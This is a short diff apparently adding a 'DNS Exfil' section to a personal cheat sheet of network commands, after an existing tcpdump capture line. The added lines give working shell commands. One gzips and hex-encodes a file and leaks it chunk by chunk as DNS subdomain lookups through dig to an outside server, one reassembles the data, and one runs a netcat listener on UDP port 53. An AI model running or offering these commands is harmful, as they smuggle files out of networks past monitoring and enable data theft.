@@ -21,4 +21,13 @@ tcpdump -vX -s0 -i inf 'tcp port ### host {domain}'
 
 for domain check add rotate function call in try block (timeout or google not exist) and after # of checks.
 
+===| DNS Exfil |===
 
+---| send data |---
+for line in `gzip -c <file> | xxd -p`; do dig <dns server> $line.<domain>; done;
+
+---| recover data |---
+cat <file> | uniq | xxd -r -p | zcat
+
+---| Simple DNS listener |---
+netcat -x <file.hex> -u -l 53
